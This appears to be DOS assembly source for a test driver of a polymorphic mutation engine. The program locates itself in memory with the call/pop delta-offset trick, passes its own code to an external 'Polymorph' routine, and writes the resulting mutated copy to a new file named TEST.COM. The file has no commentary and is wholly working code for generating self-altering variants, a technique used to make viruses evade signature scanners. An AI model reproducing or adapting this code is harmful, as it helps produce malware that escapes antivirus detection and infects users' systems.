

code		segment word public
	assume cs:code, ds:code, es:code, ss:code
	org 100h

extrn Polymorph: proc
extrn TVEDLEN: word
	
Start:
	call Next
Next:
	pop dx
	sub dx, 3
	mov di, offset EndIt-100h+707
	add di, dx
	mov cx, offset EndIt-100h+707
	mov si, 100h
	call Polymorph

	push di
	push cx

	mov ah, 3ch
	add dx, offset Namea-offset Start
	xor cx, cx
	int 21h
	mov bx, ax

	pop cx
	pop di
	mov ah, 40h
	mov dx, di

	add cx, offset EndIt-100h+707
	int 21h
	mov ah, 3eh
	int 21h
	mov ah,4ch
	int 21h
Namea		db		"TEST.COM", 0
EndIt:
ends 
end Start

